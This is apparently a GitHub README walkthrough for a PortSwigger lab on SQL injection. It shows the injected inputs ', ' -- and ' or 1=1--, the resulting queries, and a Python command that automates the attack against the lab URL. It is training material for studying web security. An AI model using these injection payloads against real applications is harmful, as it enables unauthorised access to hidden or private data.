# SQLi-Lab-01
This is ![Link-Lab](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
# Solve Lab-01
display all products both released and unreleased.
<br />

Query --> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1 `
<br />

1- The first step set `'` after value of parameter category -->  `?category='`
<br />

![step-1](screenshots/2.png)
<br />

1.1- Will appear an error `SELECT * FROM products WHERE category = ''' AND released = 1`.
<br />

![error](screenshots/3.png)
<br />

2- Step two set of after value of parameter category  `?category=' --`
<br />

![step-2](screenshots/4.png)
<br />

2.1- The error disappear `SELECT * FROM products WHERE category = ''--' AND released = 1`.
<br />

!['--](screenshots/5.png)
<br />

5- finally to solve this lab `' or 1=1--`.
<br />

![finally](screenshots/6.png)
<br />

5.1- finally Query `SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1`.

# Automation sove.
using the script python. `python3 https://0aa500220344ec58c0b8081900eb003c.web-security-academy.net "' or 1=1 --"`

<br />

Will appear this `[+] SQLi successful!` when successfully injection.
<br />

OR `[-] SQLi Falied`. when falied injection.